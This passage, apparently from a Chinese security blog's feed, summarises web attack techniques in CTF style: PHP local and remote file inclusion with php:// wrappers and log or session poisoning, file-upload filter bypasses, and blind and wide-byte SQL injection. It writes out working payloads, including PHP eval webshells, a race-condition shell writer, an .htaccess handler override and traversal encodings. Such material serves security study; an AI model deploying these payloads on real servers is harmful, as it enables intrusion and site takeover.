x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;</span><br></pre></td></tr></table></figure><h2 id="远程文件包含（RFI）"><a href="#远程文件包含（RFI）" class="headerlink" title="远程文件包含（RFI）"></a>远程文件包含（RFI）</h2><h3 id="原因-1"><a href="#原因-1" class="headerlink" title="原因"></a>原因</h3><p>php.ini配置中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen &#x3D; On （是否允许打开远程文件）</span><br><span class="line">allow_url_include &#x3D; On（是否允许include&#x2F;require远程文件）</span><br></pre></td></tr></table></figure><p>一般allow_url_fopen默认为on,但是allow_url_include在php5.2之后就默认为off</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>依然没有做过滤或防绕过</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>面对无防绕过的网站可直接构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;flag&#x2F;flag.php?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;php&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure><p>面对有限制的网站，比如如下代码，对包含的文件后加一个html后缀</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include($_GET[&#39;filename&#39;] . &quot;.html&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p>比如当远程包含phpinfo.txt时，返回时会变成phpinfo.txt.html<br>在这里我们可以利用 ？，#，空格绕过，注意#和空格用url编码编码一下具体视情况而定</p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p><img src="https://img-blog.csdnimg.cn/20190617213659994.png" alt="alt"></p><h3 id="Phar-php归档"><a href="#Phar-php归档" class="headerlink" title="Phar://(php归档)"></a>Phar://(php归档)</h3><ul><li>*<em>条件 *</em><br>php&gt;=5.3.0,注意url编码</li><li><strong>利用</strong><br><a href="http://127.0.0.1/flag.php?f=phar://attect.txt，attect.txt可写入php代码" target="_blank" rel="noopener">http://127.0.0.1/flag.php?f=phar://attect.txt，attect.txt可写入php代码</a><ul><li><strong>例题代码</strong></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $p &#x3D; new PharData(dirname(__FILE__).&#39;&#x2F;phartest.aaa&#39;,</span><br><span class="line"> 0,&#39;phartest&#39;,Phar::ZIP) ; </span><br><span class="line">$p-&gt;addFromString(&#39;testfile.txt&#39;, &#39;&lt;?php phpinfo();?&gt;&#39;); ?&gt;</span><br></pre></td></tr></table></figure><h3 id="Zip"><a href="#Zip" class="headerlink" title="Zip://"></a>Zip://</h3><ul><li><strong>条件</strong><br>php&gt;=5.3.0，在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以，需要指定绝对路径，注意url编码</li><li><strong>利用</strong><br>利用原型：zip://attect.zip#dir/file.txt,file.txt可以写入恶意PHP代码</li><li><strong>例题</strong><br><a href="http://106.12.37.37:10007/" target="_blank" rel="noopener">http://106.12.37.37:10007/</a><br>例题对应代码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $include_file&#x3D;$_GET[include_file];</span><br><span class="line"> if ( isset( $include_file ) &amp;&amp; strtolower( substr( $include_file, -4 ) ) &#x3D;&#x3D; &quot;.php&quot; )</span><br><span class="line">  &#123; require($include_file ); &#125;?&gt;</span><br></pre></td></tr></table></figure><strong>测试结果</strong><br><img src="https://img-blog.csdnimg.cn/20190617213740849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们可以注意到其实phar协议和zip协议是类似的<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter:"></a>php://filter:</h3></li><li><strong>条件</strong><br>需要开启 allow_url_fopen，不需要开启 allow_url_include；</li><li><strong>filter讲解</strong><br>php://filter 是一种元封装器，     设计用于数据流打开时的筛选过滤应用。     这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、     file() 和 file_get_contents()，     在数据流内容读取之前没有机会应用其他过滤器。   一般可用来读取敏感文件 （更多可看<a href="https://www.php.net/manual/zh/wrappers.php.php）" target="_blank" rel="noopener">https://www.php.net/manual/zh/wrappers.php.php）</a></li><li><strong>例题（对应代码会在做题结果出现）</strong><br><a href="http://chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web7/index.php</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poc: </span><br><span class="line">1.http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;web7&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br><span class="line">2.http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;web7&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>我们注意的是read可选可无，这里可以查看官方文档<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input:"></a>php://input:</h3></li><li><strong>条件</strong><br>1.allow_url_include = On。<br>2.可读取post过去的数据</li><li><strong>例题及解题过程(普通利用)</strong><br>106.12.37.37:10008<br>扫目录得到<a href="http://106.12.37.37:10008/index.php.bak" target="_blank" rel="noopener">http://106.12.37.37:10008/index.php.bak</a><br>源码如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$flag&#x3D;&#39;xxx&#39;; </span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($key))&#123; $content&#x3D;trim(file_get_contents($flag)); if($key&#x3D;&#x3D;$content)&#123; echo&#39;ctf&#123;xxx&#125;&#39;; &#125;</span><br><span class="line">else&#123; echo&#39;Oh.no&#39;;&#125; &#125;</span><br></pre></td></tr></table></figure>此题有两种方法：第一种是利用extract函数变量覆盖使content变量和key变量相等，得出flag;我们在此不做多余赘述。第二种则是利用我们的input伪协议，我们可以看到，只需要让key的值和flag的值相等，我们就可以得出flag,我们以上说过，php://input可以获取post的数据，我们按照以下的步骤即可得到flag<br><img src="https://img-blog.csdnimg.cn/20190617213810232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt=""></li><li><strong>命令执行和传入木马</strong><br><strong>条件</strong><br>php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行<br><strong>命令执行</strong><br>post数据为<?php system('ls')?><br><strong>木马</strong><br>post数据为<?php @eval($_POST[cmd])?></li><li><strong>条件</strong><br>php版本大于等于php5.2<br>allow_url_fopen = On<br>allow_url_include = On</li><li><strong>利用</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.www.flag.com&#x2F;flag.php?filename&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">2.www.flag.com&#x2F;flag.php?filename&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</span><br></pre></td></tr></table></figure>然后就出来了phpinfo界面<h2 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h2><h3 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h3></li><li><strong>条件</strong><br>日志文件存储路径，且可读</li><li><strong>利用</strong><br>web服务器会将请求写入到日志文件（上面已给出，也可搜索网上目录）中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/<br><img src="https://img-blog.csdnimg.cn/20190617213917170.png" alt="在这里插入图片描述"><br>需要注意的是我们在burp抓包进行拦截在发出请求，否则会被编码，如下，第一条是抓包发出的，第二条为在浏览器里直接进行构造，第二条失败。<br><img src="https://img-blog.csdnimg.cn/20190617213926600.png" alt="在这里插入图片描述"><br>除了可以url请求外上传还可以进行文件上传和UA上传，下图为UA上传，绕过以上包含不成功，可以看下是否是open_basedir限制了目录<br><img src="https://img-blog.csdnimg.cn/20190617213936829.png" alt="在这里插入图片描述"></li><li><strong>例题环境</strong><br>可以搜索SHACTF-2017-Web-writeup Bon Appétit，注意有两种解法，注重日志包含的那个解法。<h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3></li><li><strong>条件</strong><br>ssh log的文件位置，且可读，默认情况下为 /var/log/auth.log</li><li><strong>利用</strong><br>利用ssh连接：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@remotehost</span><br></pre></td></tr></table></figure>密码随便输入，然后包含即可<h2 id="session包含"><a href="#session包含" class="headerlink" title="session包含"></a>session包含</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3>session文件路径可知，且其中内容部分可控。<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3></li></ul><p>通过phpinfo的信息，获取到session.save_path为/var/lib/php/session<br><img src="https://img-blog.csdnimg.cn/20190617213951538.png" alt="在这里插入图片描述"><br>常见的php-session存放位置</p><ol><li>/var/lib/php/sess_PHPSESSID</li><li>/var/lib/php/sess_PHPSESSID</li><li>/tmp/sess_PHPSESSID</li><li>/tmp/sessions/sess_PHPSESSID<br>session的文件名一般为sess_+sessionid，sessionid可以通过开发者模式获取。<br>具体利用的方法，我的思路是先本地包含，将session文件包含出来，查看代码内容，然后再找有没有合适的变量进行写入payload，再进行session包含从而getshell<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3>推荐此文章和题目：<a href="https://www.codercto.com/a/33740.html" target="_blank" rel="noopener">https://www.codercto.com/a/33740.html</a><br>I春秋百度杯notebook(I春秋百度杯可找到)<h2 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h2><h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><img src="https://img-blog.csdnimg.cn/20190617214024175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>类似于文件上传的和时间竞争，向服务器上传木马文件以form-data方式提交请求上传数据时，会生成临时文件,通过phpinfo来获取临时文件的路径以及名称<br>可在网上找到脚本（博主暂时木有）<h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3>可看此wp : <a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/</a><h2 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3>php以cgi方式运行，这样environ才会保持UA头。<br>environ文件存储位置已知，且environ文件可读。<h3 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h3>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。可参考：1.The proc/self/environ Injection ，<br>shell via LFI - proc/self/environ method<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2>类似于environ，参考： LFI Cheat Sheet：/proc/self/environ LFI Method<h2 id="自包含"><a href="#自包含" class="headerlink" title="自包含"></a>自包含</h2>类似于/a.php?include=a.php<br>这样会导致不断包含自己，形成无穷递归，爆栈，最终使php无法进行后续处理<h3 id="php7SegmentFault"><a href="#php7SegmentFault" class="headerlink" title="php7SegmentFault"></a>php7SegmentFault</h3>上大佬博客：<a href="https://www.jianshu.com/p/dfd049924258" target="_blank" rel="noopener">https://www.jianshu.com/p/dfd049924258</a></li></ol><h2 id="绕过（上面讲过的方法同样适用）"><a href="#绕过（上面讲过的方法同样适用）" class="headerlink" title="绕过（上面讲过的方法同样适用）"></a>绕过（上面讲过的方法同样适用）</h2><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p><ul><li><strong>利用url编码</strong></li></ul><ol><li>../<br>%2e%2e%2f<br>..%2f<br>%2e%2e/   </li><li>..<br>%2e%2e%5c<br>..%5c<br>%2e%2e\</li></ol><ul><li><strong>二次编码</strong></li></ul><ol><li><p>../<br>%252e%252e%252f</p></li><li><p>..\</p><p> %252e%252e%255c</p></li></ol><ul><li><strong>容器/服务器的编码方式</strong></li></ul><ol><li><p>../<br>..%c0%af</p><p>%c0%ae%c0%ae/</p></li><li><p>..<br>..%c1%9c</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件包含漏洞分类&quot;&gt;&lt;a href=&quot;#文件包含漏洞分类&quot; class=&quot;headerlink&quot; title=&quot;文件包含漏洞分类&quot;&gt;&lt;/a&gt;文件包含漏洞分类&lt;/h1&gt;&lt;h2 id=&quot;本地文件包含（LFI）&quot;&gt;&lt;a href=&quot;#本地文件包含（LFI）&quot; class
      
    
    </summary>
    
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/categories/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/tags/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
      <category term="文件包含" scheme="http://y-y-k.tk/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="http://y-y-k.tk/2020/03/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://y-y-k.tk/2020/03/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2020-03-15T03:01:48.621Z</published>
    <updated>2020-03-15T03:06:22.713Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞分类："><a href="#文件上传漏洞分类：" class="headerlink" title="文件上传漏洞分类："></a>文件上传漏洞分类：</h1><h2 id="1-JS检测绕过攻击"><a href="#1-JS检测绕过攻击" class="headerlink" title="1.JS检测绕过攻击"></a>1.JS检测绕过攻击</h2><p>1）通过浏览器插件，删除检测js代码<br>2）上传后抓包，修改为php等可用后缀</p><h2 id="2-文件后缀绕过分析攻击（iis，apache等）"><a href="#2-文件后缀绕过分析攻击（iis，apache等）" class="headerlink" title="2.文件后缀绕过分析攻击（iis，apache等）"></a>2.文件后缀绕过分析攻击（iis，apache等）</h2><p>1）apache可解析以.php,.phtml为后缀的文件；在Apache1.x与Apache2.x中存在解析漏洞，不管文件的后缀是什么，只要是.php.<em>结尾，就会被Apache服务器解析成PHP文件，问题是Apache如果在mime.types文件里面没有定义的扩展名比如x1.x2.x3的情况下，最后一个x3的没有定义，那么就会将其解析成倒数第二个的x2的定义的扩展名类型。<br>2）apache的解析顺序问题，其从右到左进行解析，例如木马.php我们不可上传，且.我们知道qwe为不可解析的后缀，我们可以构造木马.php.qwe可进行上传<br>3）iis6.0：有两种方式，一是构造/木马.asp/1.jpg  ,在这里我们将木马.asp看作是一个目录，这样此目录下面的文件所有类型的后缀都会解析为asp脚本，这样我们只需要实际将1.jpg写成一个木马就可以了。二是构造木马.asp;jpg  ，在这里 ; 会将分号以后的不进行解析，这意味着我们的木马上传成功。<br>4）iis7.5，nginx：我们构造木马.jpg/.php，这样直接将jpg文件解析为php脚本<br>5）低版本的nginx(nginx 0.5.</em>——0.8.37)：构造%00.php可进行解析，然后找到任意的图片地址后面加上任意名.php，当页面返回乱码时，记下该地址连接木马即可。</p><h2 id="3-文件类型绕过攻击"><a href="#3-文件类型绕过攻击" class="headerlink" title="3.文件类型绕过攻击"></a>3.文件类型绕过攻击</h2><p>当进行正常上传图片操作的时候，我们进行抓包，我们可以看到数据包中的Content-Type的值为：image/jpeg。当我们上传php文件时，就变成了Content-Type:application/oct-stream，如果服务端只是检验Content-Type的值时，我们就可以在上传木马时将application/oct-stream改成image/jpeg，成功绕过</p><h2 id="4-文件截断绕过攻击"><a href="#4-文件截断绕过攻击" class="headerlink" title="4.文件截断绕过攻击"></a>4.文件截断绕过攻击</h2><p>00截断绕过，特殊字符（空格，.，::$DATA）截断，其中特殊字符针对windows主机</p><h2 id="5-竞争条件攻击"><a href="#5-竞争条件攻击" class="headerlink" title="5.竞争条件攻击"></a>5.竞争条件攻击</h2><p>利用服务器删除木马文件的时间差进行重新生成木马，从而达到上传目的(通俗来说，就说趁检查代码不注意，上传进去了)。php生成新木马代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">     fputs(fopen(&#39;..&#x2F;新木马.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[a])?&gt;&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="6-服务器端文件头检验"><a href="#6-服务器端文件头检验" class="headerlink" title="6.服务器端文件头检验"></a>6.服务器端文件头检验</h2><p>服务器端通过校验文件头来判断文件合法性。后面的FFD8等都为hex编码<br>图片: <a href="https://uploader.shimo.im/f/vAIz5BWbRLwfV7jo.png" target="_blank" rel="noopener">https://uploader.shimo.im/f/vAIz5BWbRLwfV7jo.png</a><br>也可以进行这样构造 木马.php文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[a])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后上传</p><h2 id="7-服务端黑名单检验"><a href="#7-服务端黑名单检验" class="headerlink" title="7.服务端黑名单检验"></a>7.服务端黑名单检验</h2><p>大小写绕过：1.Php,1.aSP等<br>猜测黑名单中没有的：PHP类型：1.php,1.php3,1.php4,1.php5,1.php7,1.pht,1.phps,1.phtml<br>ASP类型：1.asp ,1.asa ,1.cer ,1.cdx<br>ASPX类型：1.aspx ,1.ashx<br>JSP类型：1.jsp ,1.jspx</p><h2 id="8-通过修改-htaccess文件进行攻击"><a href="#8-通过修改-htaccess文件进行攻击" class="headerlink" title="8.通过修改.htaccess文件进行攻击"></a>8.通过修改.htaccess文件进行攻击</h2><p>先来了解一下.htaccess文件，.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br>通过.htaccess文件，调用php的解析器解析一个文件名只要包含“QUST”这个字符串的任意文件。这个“QUST”的内容如果是一句话木马.即可利用中国莱刀进行连接。<br>我们创建一个内容为以下代码的.htaccess文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;QUST&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd一php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>然后上传我们的文件即可，以上代码的意思是通过.htaccess文件，调用php的解析器解析一个文件名只要包含“QUST”这个字符串的任意文件。这个“QUST”的内容如果是一句话木马.即可利用中国莱刀进行连接。再写出一个木马文件为木马.QUST，上传即可</p><h2 id="9-缩略图"><a href="#9-缩略图" class="headerlink" title="9.缩略图"></a>9.缩略图</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件上传漏洞分类：&quot;&gt;&lt;a href=&quot;#文件上传漏洞分类：&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞分类：&quot;&gt;&lt;/a&gt;文件上传漏洞分类：&lt;/h1&gt;&lt;h2 id=&quot;1-JS检测绕过攻击&quot;&gt;&lt;a href=&quot;#1-JS检测绕过攻击&quot; cla
      
    
    </summary>
    
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/categories/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/tags/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
      <category term="文件上传" scheme="http://y-y-k.tk/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入（二）</title>
    <link href="http://y-y-k.tk/2020/03/15/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://y-y-k.tk/2020/03/15/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2020-03-15T03:01:26.533Z</published>
    <updated>2020-03-15T03:05:03.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入两大类："><a href="#SQL注入两大类：" class="headerlink" title="SQL注入两大类："></a>SQL注入两大类：</h1><ol><li>字符型注入<br>例如：<a href="http://XXX.com/sql/id=ok" target="_blank" rel="noopener">http://XXX.com/sql/id=ok</a> ,这里页面显示’ok’时，即为字符型型注入</li><li>数字型注入：<br>例如：<a href="http://XXX.com/sql/id=1" target="_blank" rel="noopener">http://XXX.com/sql/id=1</a> , 这里的id不需要闭合引号<br>简单来说，在于有无引号的区别，字符型可以是字符和数字，但是数字型只能是数字<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2>宽字节注入是一个针对GBK的注入<br>以下是addslashes()函数，此函数为常见防SQL注入的函数<br><img src="https://img-blog.csdnimg.cn/20190618181638930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那么绕过的方法有两种：</li><li>例如我们需要 ‘ 进行报错，那么我们前面再次加上\，得出\‘，使其转义,’生效</li><li>&#39;的url编码为%5c%27，如果我们加上%df，得出%df%5c%27，变成運’，在这里需注意的是，我们用到的是gbk格式的url编码，这里因为MySQL使用gbk进行编码的，所以可以达到目的。</li></ol><h2 id="基于约束的SQL攻击"><a href="#基于约束的SQL攻击" class="headerlink" title="基于约束的SQL攻击"></a>基于约束的SQL攻击</h2><p>适用于以下场景：<br>对于用户名数据库进行了位数约束，比如限制只能为20位，管理员的用户名为admin，我们不知道密码，那么我们就可以通过写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin                                                   x,密码：123456</span><br></pre></td></tr></table></figure><p>这时数据库会将其认为是admin，那么我们就可以通过123456进行登陆。数据库的代码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into user values(&#39;&#39;,&#39;admin                                                  x&#39;,&#39;123456&#39;)</span><br></pre></td></tr></table></figure><h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><h3 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h3><h4 id="1-left-database-1-gt-‘s’"><a href="#1-left-database-1-gt-‘s’" class="headerlink" title="1. left(database(),1) &gt; ‘s’"></a>1. left(database(),1) &gt; ‘s’</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">left()指得到字符串从左算起指定个数的字符</span><br><span class="line">示例：left(string, n)</span><br><span class="line"></span><br><span class="line">left(database(),1) &gt; &#39;s&#39; 表示数据库名第一位是否大于&#39;s&#39;</span><br><span class="line">left(database(),2) &gt; &#39;ab&#39; 表示数据库名前两位是否大于&#39;ab&#39;</span><br></pre></td></tr></table></figure><h4 id="2-substr-select-database-1-1-‘a’"><a href="#2-substr-select-database-1-1-‘a’" class="headerlink" title="2. substr((select database()),1,1) = ‘a’"></a>2. substr((select database()),1,1) = ‘a’</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">substr()和substring()实现功能均为截取字符串</span><br><span class="line">示例：substr(string, start, length)</span><br><span class="line">     substring(string, start, length)</span><br><span class="line"> 第一个参数为要处理的字符串，第二个为开始位置，第三个为截取长度</span><br><span class="line"></span><br><span class="line">substr((select database()),1,1) &#x3D; &#39;a&#39; 表示查看数据库名第一位是否等于&#39;a&#39;</span><br><span class="line">substr((select database()),2,1) &#x3D; &#39;a&#39; 表示查看数据库名第二位是否等于&#39;a&#39;</span><br></pre></td></tr></table></figure><h4 id="3-ascii-ord-mid-函数"><a href="#3-ascii-ord-mid-函数" class="headerlink" title="3. ascii(), ord(), mid()函数"></a>3. ascii(), ord(), mid()函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ascii()：将字符变为ascii码</span><br><span class="line">ord()：同ascii()</span><br><span class="line"></span><br><span class="line">mid()：截取字符串**一部分**</span><br><span class="line">示例：mid(string, start, length)</span><br><span class="line"> eg:string &#x3D; &quot;123456&quot;   mid(str, 2, 1)      结果为2</span><br><span class="line"></span><br><span class="line">ascii(substr((select database()),1,1)) &#x3D; 108</span><br><span class="line">ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1)) &gt;98 --+</span><br></pre></td></tr></table></figure><h4 id="4-regexp正则注入，like匹配注入"><a href="#4-regexp正则注入，like匹配注入" class="headerlink" title="4. regexp正则注入，like匹配注入"></a>4. regexp正则注入，like匹配注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先注意的是，此方法不能用做mssql。但是mysql同时支持like和regexp匹配，不过方法不同。</span><br><span class="line"></span><br><span class="line">eg：select user() regexp &#39;^ro&#39;</span><br><span class="line">    select user() like &#39;ro%&#39;</span><br></pre></td></tr></table></figure><p>具体可查看<a href="https://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">关于正则表达式详细讲解</a>。</p><h3 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h3><h4 id="1-If-ascii-substr-database-1-1-gt-115-0-sleep-5"><a href="#1-If-ascii-substr-database-1-1-gt-115-0-sleep-5" class="headerlink" title="1. If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))"></a>1. If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if()：判断然后返回值</span><br><span class="line"></span><br><span class="line">示例：IF(condition, value_if_true, value_if_false)</span><br><span class="line">     Less-5&#x2F;?id&#x3D;1&#39; and If(ascii(substr(database(),1,1))&gt;115,0,sleep(10)) --+</span><br></pre></td></tr></table></figure><h4 id="2-select-sleep-find-in-set-mid-user-1-1-‘a-w-t-r’-（-user-为root-localhost-）"><a href="#2-select-sleep-find-in-set-mid-user-1-1-‘a-w-t-r’-（-user-为root-localhost-）" class="headerlink" title="2. select sleep(find_in_set(mid(user(), 1, 1), ‘a,w,t,r’));    （ user()为root@localhost ）"></a>2. select sleep(find_in_set(mid(user(), 1, 1), ‘a,w,t,r’));    （ user()为root@localhost ）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 